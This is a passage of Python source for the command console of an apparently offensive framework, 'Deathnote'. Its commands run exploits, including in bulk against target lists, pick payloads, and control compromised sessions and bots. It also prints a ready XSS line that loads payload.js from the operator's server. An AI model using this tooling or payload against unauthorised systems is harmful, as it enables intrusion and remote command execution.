import sys
import os
import shlex
import time
import socket
import random
import string
import platform
import shutil
from subprocess import call
from netifaces import interfaces, ifaddresses, AF_INET
from binascii import hexlify
from functools import wraps
from core.api import API
from core.jobs import Jobs
from core.storage import LocalStorage
from core.utils.module_parser import *
from core.utils.printer import *
from core.utils.citation import citation
from core.utils.import_module import import_exploit
from base.config import DeathnoteConfig
from base.update_cve import Update_cve
from base.update_framework import Update_framework
from core.utils.function import *
from core.sessions import Sessions
from core.utils.db import *
from base.analyse import Analyse_code
from base.remote_scan import RemoteScan
from base.local_scan import LocalScan
from base.format.elf import ELF
from base.format.pe import PE
from base.function_base import pattern_create, pattern_research, random_text
from core.browser_server.browser_server import init as server
from base.scan_port import Scanner
from base.version import __version__
from base.listen import Listen
from core.commands import GLOBAL_COMMANDS, SUB_COMMANDS


def module_required(fn):
	@wraps(fn)
	def wrapper(self, *args, **kwargs):
		if not self.current_module:
			print_error("You have to activate any module with 'use' command.")
			return
		return fn(self, *args, **kwargs)

	try:
		name = "module_required"
		wrapper.__decorators__.append(name)
	except AttributeError:
		wrapper.__decorators__ = [name]
	return wrapper

def payload_module_required(fn):
	
	@wraps(fn)
	def wrapper(self, *args, **kwargs):
		if self.current_module:
			if self.current_module.type_module == "payload":
				return fn(self, *args, **kwargs)
			else:
				print_error("Module must have payload type")
				return
		print_error("You have to activate any payload with 'use' command.")
		return

	try:
		name = "payload_module_required"
		wrapper.__decorators__.append(name)
	except AttributeError:
		wrapper.__decorators__ = [name]
	return wrapper


class BaseCommand:

	@module_required
	def get_opts(self, *args):
		for opt_key in args:
			try:
				opt_description = self.current_module.exploit_attributes[opt_key][2]
				opt_required = self.current_module.exploit_attributes[opt_key][1]
				opt_display_value = self.current_module.exploit_attributes[opt_key][0]
				if self.current_module.exploit_attributes[opt_key][3]:
					continue
			except (KeyError, IndexError, AttributeError):
				pass
			else:
				yield opt_key, opt_display_value, opt_required, opt_description		

	@module_required
	def get_opts_adv(self, *args):
		for opt_key in args:
			try:
				opt_description = self.current_module.exploit_attributes[opt_key][2]
				opt_required = self.current_module.exploit_attributes[opt_key][1]
				opt_display_value = self.current_module.exploit_attributes[opt_key][0]
			except (KeyError, AttributeError):
				pass
			else:
				yield opt_key, opt_display_value, opt_required, opt_description

	def get_command_handler(self, command):
		try:
			command_handler = getattr(self, "command_{}".format(command))
		except AttributeError:
			raise DeathnoteException("Unknown command: '{}'".format(command))
		return command_handler		

	def check_options_required(self, ignore=""):
		missing_required = []
		for i in self.current_module.options:
			if i == ignore:
				continue
			required = self.current_module.exploit_attributes[i][1]
			value = self.current_module.exploit_attributes[i][0]
			if required == "yes" and value == '':
				missing_required.append(i)
		
		if not missing_required:
			return True
		else:
			message = "Missing options: "
			for i in missing_required:
				message += i
				message += " "
				
			print_error(message)
			print_status("Type: show options")
			return False

	@property
	def module_metadata(self):
		return getattr(self.current_module, "_{}__info__".format(self.current_module.__class__.__name__))

	def get_plugins(self, *args, **kwargs):
		plugins = db.query(Modules).filter(Modules.type_module=='plugin').all()
		for plugin in plugins:
			self.plugins_help[plugin.name] = plugin.description
			self.plugins.append(plugin.name)	
			GLOBAL_COMMANDS.append(plugin.name)
		
class All_commands(BaseCommand):

	global_help = """Global commands:
	help                                       Print this help menu
	use <module>                               Select a module for use
	search <search term>                       Search for appropriate module
	search_cve <cve id>                        Search cve id in database
	banner                                     Print the banner
	load                                       Load a .sc file
	clear                                      Clean screen 
	sleep                                      Do nothing for the specified number of seconds
	tor [-h]                                   Check tor
	ip                                         Show your IP address
	busy_port                                  Show all ports that are in use
	echo <text>                                Print text
	pattern_create <number>                    Create pattern              
	pattern_research <pattern>                 Search pattern offset
	listen <port>                              Listen to connections, default:4000
	auto_attack [-h]                           Execute auto attack list when session created
	jobs [-h]                                  Display jobs
	sessions [-h]                              Display sessions
	browser_server <port>                      Start browser server for execute javascript   
	scan [-h]                                  Scan port of target
	remotescan [-h]                            Run remotescan on target
	localscan [-h]                             Run localscan on session
	update                                     Update framework
	output                                     List output directory 
	api_session <port>                         Start api for control sessions in remote, default port:8008
	exit                                       Exit deathnote
	"""
	
	module_workspace = """Workspace commands:
	workspace [-h]                             Manage workspaces
	target [-h]                                Manage targets of workspace
	reset_default_workspace                    Reset a default workspace
	duplicate_workspace <new name>             Duplicate current workspace
	"""
	
	module_creds = """Creds commands:
	creds [-h]                                 List all credentials in the database
	"""

	module_help = """Module commands:
	run                                        Run the selected module with the given options
	check                                      Check if a given target is vulnerable
	massrun <files with targets>               Run the selected module with the given options on a lot of target
	back                                       Unselect the current module
	set <option name> <option value>           Set an option for the selected module
	show [info|options|version]                Print information, options, or versions if multiple versions exist
	payloads                                   Show available payloads for module selected
	encoders                                   Show available encoders for payload selected	
	version                                    Show all versions if multiple versions exist. For change: set version [number]
	generate [-h]                              Only with payload module, generate a payload with selected format
	"""

    
	module_asm = """Assembly commands:
	archs                                      Show all architecture
	setarch <arch>                             Change architecture
	asm <assembly code>                        Assembly code
	syscall <name>                             Show info of syscall
	disass <raw bytes>                         Disassemble code
	"""
    
    
	module_developer = """Developer commands:
	edit                                       Edit current module
	pyshell                                    Run python shell          
	doc <lib>                                  Show all methods of lib
	new_module                                 Create new module
	new_scan                                   Create new module for scaninfo 
	"""

	module_db = """Database commands:
	db_reload_all                              Reload all modules in database
	reload                                     Reload current module in database
	update_cve                                 Update last cve	
	"""

	
	def __init__(self):
		
		self.api = API()
		self.cve = Update_cve()
		self.jobs = Jobs()
		self.local_storage = LocalStorage()
		self.my_config = DeathnoteConfig()
		self.analyse = Analyse_code() 
		self.session = Sessions()
		self.current_module = None
		self.current_module_path = None
		self.list_available_payload = []
		self.list_available_encoders = []
		self.current_payload = None
		self.add_auto_attacks = {}
		self.plugins = []
		self.plugins_help = {}
			
	def command_help(self, *args, **kwargs):
		print_info("\n")
		print_info(self.global_help)
		print_info(self.module_help)
		print_info(self.module_asm)
		print_info(self.module_developer)
		print_info(self.module_creds)
		print_info(self.module_workspace)
		print_info(self.module_db)
		if len(self.plugins) != 0:
			print_info("Plugins:")
			for i in self.plugins_help:
				space = 43-len(i)
				print_info("\t"+i+" "*int(space)+self.plugins_help[i])			
		print_info("\n")

	def command_clear(self, *args, **kwargs):
		if os.name != 'nt':
			os.system('clear')
		else:
			os.system('cls')

	def command_citation(self, *args, **kwargs):
		print_info(citation)
  
	def slow_start(self, *args, **kwargs):
		print_slow(citation)
		print_slow(self._banner())
	
	def command_exit(self, *args, **kwargs):
		self.jobs.exist_jobs()
		sys.exit(0)

	def command_quit(self, *args, **kwargs):
		self.command_exit()

	def command_syscall(self, word, *args, **kwargs):
		print_status("Arch: ",self.analyse.arch)
		if self.analyse.arch == 'x32':
			headers = ["num", "syscall", "eax", "ebx", "ecx", "edx", "esi", "edi", "REF"]
			with open('data/syscall/intel_x86.csv','r') as filename:
				syscall_file = filename.readlines()

		elif self.analyse.arch == 'x64':
			headers = ["num", "syscall", "rax","rdi", "rsi", "rdx", "r10", "r8", "r9", "REF"]
			with open('data/syscall/intel_x64.csv','r') as filename:
				syscall_file = filename.readlines()
				
		elif self.analyse.arch == 'arm_32':
			headers = ["num", "syscall", "r7", "r0", "r1", "r2", "r3", "r4", "r5"]
			with open('data/syscall/arm32.csv','r') as filename:
				syscall_file = filename.readlines()
				
		elif self.analyse.arch == 'arm_64':
			headers = ["num", "syscall", "x8", "x0", "x1", "x2", "x3", "x4", "x5", "REF"]
			with open('data/syscall/arm64.csv','r') as filename:
				syscall_file = filename.readlines()
		else:
			print_error("Arch not supported")
			return 
		if word:
			table = []
			for line in syscall_file:
					line = line.strip("\n")
					line = line.split(",")
					table.append(line)
		
			result = []
			for array in table:
				for element in array:
					if word in element:
						result.append(array)
						break
			print_table(headers, *result)
		else:
			print_error("Missing argument, e.g: syscall read")    

	def command_api_session(self, *args, **kwargs):
		""" Start api for control session in remote. """
		parser = ModuleArgumentParser(description=self.command_api_session.__doc__, prog="api_session")
		parser.add_argument("-p", dest="port", help="start api at port", metavar="<port>", type=int, default=8008)		
		pargs = parser.parse_args(shlex.split(args[0]))
		if args[0] == '':
			parser.print_help()
		else:
			if pargs is None:
				return			
			if pargs.port:
				user = self.my_config.get_config('API','user')
				password = self.my_config.get_config('API','password')
				self.jobs.create_job("Rest api", f":{pargs.port}", self.api.init, [pargs.port])
				print_success(f"Rest api started at :{pargs.port}")
				print_status(f"Username: {user}")
				print_status(f"Password: {password}")

	def command_jobs(self, *args, **kwargs):
		""" Active jobs manipulation and interaction. """
		parser = ModuleArgumentParser(description=self.command_jobs.__doc__, prog="jobs")
		parser.add_argument("-k", dest="kill", help="kill a job", metavar="<job_id>", type=int)
		parser.add_argument("-l", action="store_true", dest="list", help="list all active jobs")

		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs.list:
					jobs_data = list()
					headers = ("ID", "Name", "Info")
					jobs = self.local_storage.get("jobs")
					if jobs:
						for job_id in jobs.keys():
							jobs_data.append((job_id, jobs[job_id]['job_name'], jobs[job_id]['module_name']))
						print_info("\n")
						print_info("Active jobs")
						print_table(headers, *jobs_data)
					else:
						print_error("No active jobs")

				if isinstance(pargs.kill, int):
					self.jobs.delete_job(pargs.kill)
					print_success("Job killed")
		except MyParserException as e:
			print_error(e)	

	def reload_count_modules(self):
		self.local_storage.set("exploits", db.query(Modules).filter(Modules.type_module=="exploits").count())	
		self.local_storage.set("auxiliary", db.query(Modules).filter(Modules.type_module=="auxiliary").count())			
		self.local_storage.set("post", db.query(Modules).filter(Modules.type_module=="post").count())			
		self.local_storage.set("browser_exploits", db.query(Modules).filter(Modules.type_module=="browser_exploits").count())			
		self.local_storage.set("browser_auxiliary", db.query(Modules).filter(Modules.type_module=="browser_auxiliary").count())			
		self.local_storage.set("payloads", db.query(Modules).filter(Modules.type_module=="payloads").count())			
		self.local_storage.set("bot", db.query(Modules).filter(Modules.type_module=="bot").count())			
		self.local_storage.set("encoders", db.query(Modules).filter(Modules.type_module=="encoders").count())			
		self.local_storage.set("listeners", db.query(Modules).filter(Modules.type_module=="listeners").count())			
		self.local_storage.set("backdoors", db.query(Modules).filter(Modules.type_module=="backdoors").count())			
		self.local_storage.set("plugins", db.query(Modules).filter(Modules.type_module=="plugin").count())			
		self.local_storage.set("remotescan", db.query(Modules).filter(Modules.type_module=="remotescan").count())			
		self.local_storage.set("localscan", db.query(Modules).filter(Modules.type_module=="localscan").count())			
		self.local_storage.set("cve", db.query(Cve).count())			
		self.local_storage.set("dev",  db.query(Modules).filter(Modules.type_module=="dev").count())

	def _banner(self, *args, **kwargs):
		self.reload_count_modules()
		banner = f"""

       =[ Deathnote v{__version__}
+ -- --=[ {self.local_storage.get('exploits')} exploits - {self.local_storage.get('auxiliary')} auxiliary - {self.local_storage.get('post')} post
+ -- --=[ {self.local_storage.get('browser_exploits')} browser_exploits - {self.local_storage.get('browser_auxiliary')} browser_auxiliary
+ -- --=[ {self.local_storage.get('payloads')} payloads - {self.local_storage.get('encoders')} encoders - {self.local_storage.get('plugins')} plugins
+ -- --=[ {self.local_storage.get('listeners')} listeners - {self.local_storage.get('backdoors')} backdoors - {self.local_storage.get('bot')} bots
+ -- --=[ {self.local_storage.get('remotescan')} remotescan - {self.local_storage.get('localscan')} localscan
+ -- --=[ {self.local_storage.get('cve')} cve - {self.local_storage.get('dev')} dev\n"""
		return banner

	def command_banner(self, *args, **kwargs):
		print(self._banner())

	def command_back(self, *args, **kwargs):
		self.current_module = None
		self.list_available_payload = []

	def command_use(self, module_path, *args, **kwargs):
		module_path = pythonize_path(module_path)
		module_path = ".".join(("modules",module_path))
		try:
			loaded_module = import_exploit(module_path)()
		except SyntaxError as e:
			print_error(e)
			return

		if loaded_module.type_module == 'encoder':
			print_error("Module encoder cannot to be loaded")
		elif loaded_module.type_module == 'remotescan':
			print_error("Remotescan module cannot to be loaded")
		elif loaded_module.type_module == 'localscan':
			print_error("Localscan module cannot to be loaded")
		elif loaded_module.type_module == 'payload':
			self.current_module = loaded_module
			self.current_module_path = module_path
			self.list_available_payload.clear()
			self.list_available_encoders.clear()
			if 'arch' in self.current_module._Module__info__:
				check_encoders = db.query(Modules.path).filter(Modules.type_module=="encoders").filter(Modules.arch==self.current_module._Module__info__['arch']).all()
			else:
				check_encoders = []
				print_warning("Payload don't have 'arch' in __info__")
			for encoder_found in check_encoders:
				self.list_available_encoders.append(encoder_found[0]) 
		else:
			self.current_module = loaded_module
			self.current_module_path = module_path
			self.list_available_payload.clear()
			self.list_available_encoders.clear()
			if loaded_module.type_module == 'exploit' or loaded_module.type_module == 'browser_exploit' or loaded_module.type_module == 'exploit_local':
				try:
					info_payload = self.current_module._Module__info__['payload']
					if "default" in info_payload:
						if info_payload['default'] == 'nopayload':
							del self.current_module.exploit_attributes['payload']
							return
						else:
							try:
								self.current_module.exploit_attributes['payload'][0] = info_payload['default']
								self.current_payload = info_payload['default']
								setattr(self.current_module, 'payload', info_payload['default'])								
							except:
								print_error("Default payload doesn't exist")
        
					elif "fixed" in info_payload:
						try:
							self.current_module.exploit_attributes['payload'][0] = info_payload['fixed']
							self.current_payload = info_payload['fixed']
							setattr(self.current_module, 'payload', info_payload['fixed'])								
						except:
							print_error("Default payload doesn't exist")
						return
					
					#todo
					if "category" in info_payload.keys():
						category = info_payload['category']
						if category in ['singles', 'stagers']:
							platform = []
							arch = ""
							if "platform" in info_payload:
								_platform = info_payload['platform']
								if _platform == "all":
									platform.extend(["linux", "unix", "windows"])
								elif isinstance(_platform, str):
									platform = [_platform]
							if "arch" in info_payload:
								arch = info_payload['arch']

							if platform:
								for p in platform:
									if arch == "cmd":
										check_payloads = db.query(Modules.path).filter(Modules.type_module=="payloads").filter(Modules.path.like(f"payloads/singles/cmd/{p}%")).all()
										for payload_found in check_payloads:
											self.list_available_payload.append(payload_found[0])								
									else:
										check_payloads = db.query(Modules.path).filter(Modules.type_module=="payloads").filter(Modules.platform==p).filter(Modules.arch==arch).all()
										for payload_found in check_payloads:
											self.list_available_payload.append(payload_found[0])
							else:
								check_payloads = db.query(Modules.path).filter(Modules.type_module=="payloads").filter(Modules.arch==arch).all()
								for payload_found in check_payloads:
									self.list_available_payload.append(payload_found[0])	
         
							if "encoder" in info_payload.keys():
								self.list_available_encoders.append(info_payload['encoder'])
							else:
								check_encoders = db.query(Modules.path).filter(Modules.type_module=="encoders").filter(Modules.arch==arch).all()
								for encoder_found in check_encoders:
									self.list_available_encoders.append(encoder_found[0])

						elif category in ['one_side']:
							pass
							 
						else:
							print_error("Category of payload not singles or stagers")
							return
					else:
						print_error("Payload must have 'type' info, singles or stagers")
						return
				except:
					print_warning("Try add payload info in this module")	


	def command_listen(self, port, *args, **kwargs):
		try:
			if not port:
				port = 4000
			port = int(port)
			l = Listen(port)
			l.run()
		except KeyboardInterrupt:
			print_error("KeyboardInterrupt, server stoped")
			l.stop()
		except:
			print_error("Connection failed")
			l.stop()

	@module_required
	def command_run(self, *args, **kwargs):
		if self.current_module.type_module == "payload":
			print_error("You cannot run payload, try: generate -h")
			return		
			
		if self.check_options_required():
			try:
				print_status("Running module ...")
				self.current_module.exploit()
			except SyntaxError as e:
				print_error(e)
			except AttributeError as e:
				print_error(e)
			except NameError as e:
				print_error(e)
			except KeyboardInterrupt as e:
				print_error(e)
			except ValueError as e:
				print_error(e)

	@module_required
	def command_massrun(self, *args, **kwargs):
		""" Run module on multiple target with target file """
		parser = ModuleArgumentParser(description=self.command_massrun.__doc__, prog="massrun")
		parser.add_argument("-f", dest="filename", help="file with targets", metavar="<filename>", type=str, required=True)
		parser.add_argument("-t", dest="target_option", help="target option to e.g: ftp_user or target ,...", metavar="<target option>", type=str, required=True)
			
		try:
			if self.current_module.type_module == "payload":
				print_error("You cannot run payload, try: generate -h")
				return				
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				
				if isinstance(pargs.filename, str) and isinstance(pargs.target_option, str):
					with open(pargs.filename, "r") as filename:
						hosts = filename.readlines()
					for host in hosts:
						self.command_set(f"{pargs.target_option} {host.strip()}")									
						if self.check_options_required():
							try:
								print_status("Running module ...")
								self.current_module.exploit()
							except SyntaxError as e:
								print_error(e)
							except AttributeError as e:
								print_error(e)
							except NameError as e:
								print_error(e)
							except KeyboardInterrupt as e:
								print_error(e)
							except ValueError as e:
								print_error(e)
				else:
					parser.print_help()
		except MyParserException as e:
			print_error(e)							

	@module_required
	def command_check(self, *args, **kwargs):
		if self.current_module.type_module == "payload":
			print_error("You cannot check payload, try: generate -h")
			return
		if self.current_module.type_module == "encoder":
			print_error("You cannot check encoder")
			return			
		if self.check_options_required():
			print_status("Running module ...")
			try:
				result = self.current_module.check()
			except Exception as e:
				print_error(e)
			except SyntaxError as e:
				print_error(e)
			except AttributeError as e:
				print_error(e)
			except NameError as e:
				print_error(e)
			except KeyboardInterrupt as e:
				print_error(e)
			except ValueError as e:
				print_error(e)		
			else:
				if result is True:
					print_success("Target is vulnerable")
				elif result is False:
					print_error("Target is not vulnerable")
				else:
					print_status("Target could not be verified")						

	def command_show(self, *args, **kwargs):
		sub_command = args[0]
		try:
			getattr(self, "_show_{}".format(sub_command))(*args, **kwargs)
		except AttributeError:
			print_error("Unknown 'show' sub-command '{}'. ".format(sub_command))		

	@module_required
	def _show_options(self, *args, **kwargs):
		target_names = ["target", "port", "ssl"]
		try:
			payload_names = self.current_module.payload_options
		except:
			payload_names = []
		target_opts = [opt for opt in self.current_module.options if opt in target_names]
		payload_opts = [opt for opt in self.current_module.options if opt in payload_names]
		module_opts = [opt for opt in self.current_module.options if opt not in target_opts]
		module_opts = [opt for opt in module_opts if opt not in payload_opts]
		headers = ("Name", "Current settings", "Required", "Description")
		if target_opts:
			print_info("\nTarget options:")
			print_table(headers, *self.get_opts(*target_opts))

		if module_opts:
			print_info(f"\nModule options ({humanize_path(self.current_module_path)}):")
			print_table(headers, *self.get_opts(*module_opts))

		if payload_opts:
			print_info("\nPayload options:")
			print_table(headers, *self.get_opts(*payload_opts))		
		
	@module_required
	def _show_advanced(self, *args, **kwargs):
		target_names = ["target", "port", "ssl"]
		target_opts = [opt for opt in self.current_module.options if opt in target_names]
		try:
			payload_names = self.current_module.payload_options
		except:
			payload_names = []
		payload_opts = [opt for opt in self.current_module.options if opt in payload_names]	
		module_opts = [opt for opt in self.current_module.options if opt not in target_opts]
		module_opts = [opt for opt in module_opts if opt not in payload_opts]
		headers = ("Name", "Current settings", "Required", "Description")

		if target_opts:
			print_info("\nTarget options:")
			print_table(headers, *self.get_opts_adv(*target_opts))

		if module_opts:
			print_info(f"\nModule options ({humanize_path(self.current_module_path)}):")
			print_table(headers, *self.get_opts_adv(*module_opts))

		if payload_opts:
			print_info("\nPayload options:")
			print_table(headers, *self.get_opts_adv(*payload_opts))	
		print_info()

	@module_required
	def _show_version(self, *args, **kwargs):
		try:
			versions = self.current_module._Module__info__['version']
			if versions:
				if isinstance(versions, dict):
					print_info()
					print_info("\t id\tversion")
					print_info("\t --\t-------")	
					print_info()			
					for i,j in enumerate(versions.keys()):
						if i == self.current_module.current_version:
							print_info(f"\t*{i}\t{j}")
						else:
							print_info(f"\t {i}\t{j}")
					print_info()
				else:
					print_error("version option must be dict in module")
		except:
			print_error("No version found")

	@module_required
	def command_set(self, *args, **kwargs):
		key, _, value = args[0].partition(" ")
		if key == "version":
			try:
				if value == '':
					print_error("select a id of version: show version")
				elif int(value) < len(self.current_module._Module__info__['version']):
					self.current_module.current_version = int(value)
					print_success("{} => {}".format(key, value))
				else:
					print_error(f"'{value}' is out of list, try command: show version")
			except ValueError as e:
				print_error(e)
		else:
			if key in self.current_module.options:
				if key == 'payload':
					if value in self.list_available_payload:
						setattr(self.current_module, key, '{}'.format(value))
						self.current_module.exploit_attributes[key][0] = value
						print_success("{} => {}".format(key, value))
					else:
						print_error("Payload is not available for this module")
						print_warning("Check available payload with this command: payload")
				elif key == 'encoder':
					if value in self.list_available_encoders or  value == "":
						setattr(self.current_module, key, '{}'.format(value))
						self.current_module.exploit_attributes[key][0] = value						
						print_success("{} => {}".format(key, value))
					else:
						print_error("Encoder is not available for this payload")
						print_warning("Check available encoder with this command: encoders")						
				else:
					setattr(self.current_module, key, '{}'.format(value))
					self.current_module.exploit_attributes[key][0] = value

					print_success("{} => {}".format(key, value))
				
			else:
				print_error("You can't set option '{}'.\nAvailable options: {}".format(key, self.current_module.options))

	@module_required
	def _show_info(self, *args, **kwargs):
		pprint_dict_in_order(
			self.module_metadata,
			(),
		)
		print_info()
	
	def command_info(self, *args, **kwargs):
		self._show_info()
		
	def command_update_cve(self, *args, **kwargs):
		self.cve.check_for_update()

	def command_update(self, *args, **kwargs):
		start = Update_framework()
		start.update()
	
	def command_db_reload_all(self, *args, **kwargs):
		print_status("Scan repository...")
		modules = []
		modules_error = []
		plugins = []
		plugins_error = []
		count_module_deleted = 0
		count_module_added = 0
		count_plugin_deleted = 0
		count_plugin_added = 0

		load_db = db.query(Modules.path).filter(or_(Modules.type_module=='exploits', 
												Modules.type_module=='auxiliary',
												Modules.type_module=='post',
												Modules.type_module=='browser_exploit',
												Modules.type_module=='browser_auxiliary',
												Modules.type_module=='backdoors',
												Modules.type_module=='listeners',
												Modules.type_module=='bot',
												Modules.type_module=='payloads',
												Modules.type_module=='encoder',
												Modules.type_module=='dev')).all()

		modules = [value for value, in load_db]
		load_plugin = db.query(Modules.path).filter(Modules.type_module=='plugin').all()

		plugins = [value for value, in load_plugin]
		print_info("\n")
		print_info("Modules added in database")
		print_info("-------------------------")		
		for (dirpath, dirnames, filenames) in os.walk('modules'):
			for i in filenames:
				if not i.startswith('__') and i.endswith('.py'):
					try:
						path = dirpath.replace('\\','/')
						path = path+'/'+i
						get_info = pythonize_path(path)[:-3]
						try:
							info_module = import_exploit(get_info)()
						except Exception as e:
							modules_error.append(get_info)
							continue
   
						if path.startswith('modules/remotescan') or path.startswith('modules/localscan'):
							info = getattr(info_module, "__info__".format(info_module.__class__.__name__))
						else:
							info = getattr(info_module, "_{}__info__".format(info_module.__class__.__name__))
				
						check_in_db = db.query(Modules).filter(Modules.path == path[8:][:-3]).first()
						if not check_in_db:		
							plugin = ""
							cve = ""
							platform = ""
							arch = ""
							if 'cve' in info.keys():
								if isinstance(info['cve'], str):
									cve = info['cve']
								elif isinstance(info['cve'], list):
									cve = ','.join(info['cve'])
							if 'plugins' in info.keys():
								if isinstance(info['plugins'], str):
									plugin = info['plugins']
							if 'platform' in info.keys():
								if isinstance(info['platform'], str):
									platform = str(info['platform'])
								elif isinstance(info['platform'], list):
									platform = ','.join(info['platform'])
							if 'arch' in info.keys():
								if isinstance(info['arch'], str):
									arch = str(info['arch'])
								elif isinstance(info['arch'], list):
									arch = ','.join(info['arch'])
							add_module = Modules(type_module=get_info.split(".")[1], 
                            					path=path[8:][:-3], 
                                 				name=info['name'],
                                     			description=info['description'].strip(),
                                        		cve=cve,
                                          		plugin=plugin,
                                            	platform=platform,
												arch=arch
                                             	)
							db.add(add_module)
							check_cve = db.query(Cve).filter(Cve.cve_id=="CVE-"+cve).first()
							if check_cve:
								if get_info.split(".")[1] == "exploits":
									check_cve.module_exploit = path[8:][:-3]
								if get_info.split(".")[1] == "auxiliary":
									check_cve.module_auxiliary = path[8:][:-3]
								if get_info.split(".")[1] == "post":
									check_cve.module_post = path[8:][:-3]
								if get_info.split(".")[1] == "browser_exploit":
									check_cve.module_browser_exploit = path[8:][:-3]	
								if get_info.split(".")[1] == "browser_auxiliary":
									check_cve.module_browser_auxiliary = path[8:][:-3]	
								if get_info.split(".")[1] == "remotescan":
									check_cve.module_remotescan = path[8:][:-3]
								if get_info.split(".")[1] == "localscan":
									check_cve.module_localscan = path[8:][:-3]
							db.commit()	
							count_module_added += 1
							db.close()
							print_success(path)
						if path[8:][:-3] in modules:		
							modules.remove(path[8:][:-3])
					except:
						modules_error.append(humanize_path(get_info))

		print_info("\n")
		print_info("Plugins added in database")
		print_info("-------------------------")	
		try:
			folder_plugins = os.listdir('plugins')
		except:
			os.mkdir('plugins')
			folder_plugins = []
		for i in folder_plugins:
			if os.path.isfile('plugins/'+i):
				if not i.startswith('__') and i.endswith('.py'):
					plugin_path = ".".join(("plugins", i.split('.')[0]))
					try:
						self.current_plugin = import_exploit(plugin_path)()
						check_in_db = db.query(Modules).filter(Modules.path == humanize_path(plugin_path)).first()
						db.close()
						if not check_in_db:
							add_plugin = Modules(type_module="plugin", 
                            					path=humanize_path(plugin_path), 
                                 				name=self.current_plugin.__info__['name'],
                                     			description=self.current_plugin.__info__['description'].strip(),
                                        		)
							db.add(add_plugin)
							db.commit()
							db.close()
							count_plugin_added += 1
							print_success(humanize_path(plugin_path))
						if humanize_path(plugin_path) in plugins:
							plugins.remove(humanize_path(plugin_path))
					except:
						plugins_error.append(humanize_path(plugin_path))
		if plugins:
			print_info("\n")
			print_info("Plugins deleted in database")
			print_info("--------------------------")
			for p in plugins:
				delete_plugin = db.query(Modules).filter(Modules.path == p).first()
				db.delete(delete_plugin)
				db.commit()
				count_plugin_deleted += 1
				print_status(p)
						
		if modules:
			print_info("\n")
			print_info("Modules deleted in database")
			print_info("---------------------------")
			for m in modules:
				delete_module = db.query(Modules).filter(Modules.path == m).first()
				db.delete(delete_module)
				db.commit()
				count_module_deleted += 1
				print_status(m)
		if modules_error:
			print_info("\n")
			print_info("Modules can't be loaded")
			print_info("-----------------------")
			for error in modules_error:
				print_error(error)
		print_info()		
		print_status(f"New modules: {count_module_added}")		
		print_status(f"Deleted modules: {count_module_deleted}")		
		print_status(f"Error modules: {len(modules_error)}")	
		print_info()
		print_status(f"New plugins: {count_plugin_added}")		
		print_status(f"Deleted plugins: {count_plugin_deleted}")		
		print_status(f"Error plugins: {len(plugins_error)}")				
		print_info()
		print_success("Done!")
		db.close()
		self.get_plugins()
		self.reload_count_modules()
			
	def command_sleep(self, seconds, *args, **kwargs):	
		if seconds:	
			time.sleep(int(seconds))

	def command_ip(self, *args, **kwargs):
		print_info()
		print_info("\tip")
		print_info("\t--")
		for ifaceName in interfaces():
			addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
			if addresses[0] != "No IP addr":
				print_info(f"\t{addresses[0]}")
		print_info()


	def command_archs(self, *args, **kwargs):
		for i in self.analyse.archs:
			if self.analyse.arch == i:
				print_success(i)
			else:
				print_status(i)	

	def command_setarch(self, *args, **kwargs):
		if self.analyse.setarch(args[0]):
			print_success('Change for',args[0])
		else:
			print_error('Architecture not found, try "archs"')


	def command_asm(self, code="", *args, **kwargs):
		code = code.replace("'", "")
		code = code.replace('"', '')
		asm = self.analyse.assembly(code)
		if asm:
			print_info(f"\t\tBytes count : {asm['Bytes count']}")
			print_info(f"\t\tRaw bytes : {asm['Raw bytes']}")
			print_info(f"\t\tHex string : {asm['Hex string']}")
		else:
			print_error('Error instruction')
			
	def command_disass(self, code="", *args, **kwargs):
		code = code.replace("'", "")
		code = code.replace('"', '')
		disass = self.analyse.disassembly(code)
		if disass:
			for instruction in disass:
				print_info(f"\t\t{instruction['address']}:\t{instruction['mnemonic']}\t{instruction['op_str']}")
		else:
			print_error('Error instruction')

	def command_browser_server(self, *args, **kwargs):
		""" Start http server. """
		parser = ModuleArgumentParser(description=self.command_browser_server.__doc__, prog="browser_server")
		parser.add_argument("-p", dest="port", help="port to start http server", default=5000, metavar="<port number>", type=int)
			
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return
				if isinstance(pargs.port, int):	
					self.jobs.create_job("Browser server", f":{pargs.port}", server, [pargs.port])
					print_status("Browser server started")
					print_status(f"Vulnerable url: http://0.0.0.0:{pargs.port}")
					print_status(f"Xss: <script id='deathnote' src='http://0.0.0.0:{pargs.port}/payload.js'></script>")	
									
		except MyParserException as e:
			print_error(e)
	

	
	def command_sessions(self, *args, **kwargs):
		""" Active session manipulation and interaction. """
		parser = ModuleArgumentParser(description=self.command_sessions.__doc__, prog="sessions")
		parser.add_argument("-i", dest="interact", help="pop a shell on a given session", metavar="<session_id>", type=int)
		parser.add_argument("-k", dest="kill", help="kill the selected session", metavar="<session_id>", type=int)
		parser.add_argument("-l", action="store_true", dest="list", help="list all active sessions")
		parser.add_argument("-n", nargs=2, dest="rename", help="rename session", metavar=("<session_id>", "<rename>"),type=str)
		parser.add_argument("-c", dest="check", help="check info session (platform, version)", metavar=("<session_id>"),type=int)
		parser.add_argument("-b", dest="bot", help="create bot with this session", metavar=("<session_id>"),type=int)
		parser.add_argument("-u", dest="upgrade", help="try to upgrade shell", metavar=("<session_id>"), type=int)
		parser.add_argument("-x", nargs=2, dest="execute", help="execute command on session", metavar=("<session_id>", "<cmd>"), type=str)
			
		try:
			pargs = parser.parse_args(shlex.split(args[0]))
			if args[0] == '':
				parser.print_help()
			else:
				if pargs is None:
					return
				if isinstance(pargs.interact, int):
					all_sessions = self.session.get_all_sessions()
					if pargs.interact in all_sessions:
						self.local_storage.set("in_session", pargs.interact)
						self.session.interactive(pargs.interact)	
					else:
						print_error("Session doesn't exist")
    
				if isinstance(pargs.kill, int):
					self.session.kill_session(pargs.kill)
      
				if isinstance(pargs.check, int):
					print_status("Checking...")
					self.session.check(pargs.check)	

				if isinstance(pargs.execute, list):
					all_sessions = self.session.get_all_sessions()
					if int(pargs.execute[0]) in all_sessions:
						r = self.session.execute(pargs.execute[0], pargs.execute[1])
						print_info(r)
					else:
						print_error("Session doesn't exist")

				if isinstance(pargs.rename, list):
					all_sessions = self.session.get_all_sessions()
					if int(pargs.rename[0]) in all_sessions:
						self.session.rename_session(pargs.rename[0],pargs.rename[1])
					else:
						print_error("Session doesn't exist")

